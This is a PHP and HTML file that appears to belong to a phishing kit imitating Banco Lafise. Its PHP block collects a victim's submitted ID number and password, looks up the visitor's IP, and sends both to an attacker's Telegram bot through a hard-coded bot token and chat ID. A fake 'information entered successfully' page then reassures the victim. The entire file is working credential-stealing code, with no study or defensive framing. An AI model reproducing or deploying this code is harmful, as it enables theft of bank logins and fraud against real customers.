<?php
$token = '5545935446:AAEaPWR8OUOL-0OBbqMLzioXF9jXLNT7jbM';
$website = 'https://api.telegram.org/bot'.$token;

    $ip = $_SERVER["REMOTE_ADDR"];
    $chat_id = "5157616506";
   


if (isset($_POST["dni"]) && isset($_POST["cpass"])) {
    $dni = $_POST['dni'];
    $cpass = $_POST['cpass'];
    
    
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/" . $ip);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$ip_data_in = curl_exec($ch);
curl_close($ch);
$ip_data = json_decode($ip_data_in, true);

 
    

    
    $msg = "\nCorreo Lafise\nDni: => " . $dni . "\nPassword: => " . $cpass . "\n📍 IP: " . $ip . "\n==========================\n";
            
    
     $url = $GLOBALS['website'].'/sendMessage?chat_id='.$chat_id.'&parse_mode=HTML&text='.urlencode($msg);
            file_get_contents($url);
    
        
        
}

?>



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="sc.css">
</head>
<body class="body">
    


<div class="nav">
.
</div>
<img class="laf" src="log2.png" alt="">

<br><br><br><br>

<center>

<div class="caja"> 


<form action="">


    <img class="img" src="log.png" alt="">

    <br>
    <br>
<h1 style="font-size: 18px;">¡Información ingresada exitosamente!</h1>
  <a class="lol" >Podrá seguir disfrutando de nuestros servicios.</a>

<br>
<br>


<br>
 



 
</form>

</div>


















</body>
</html>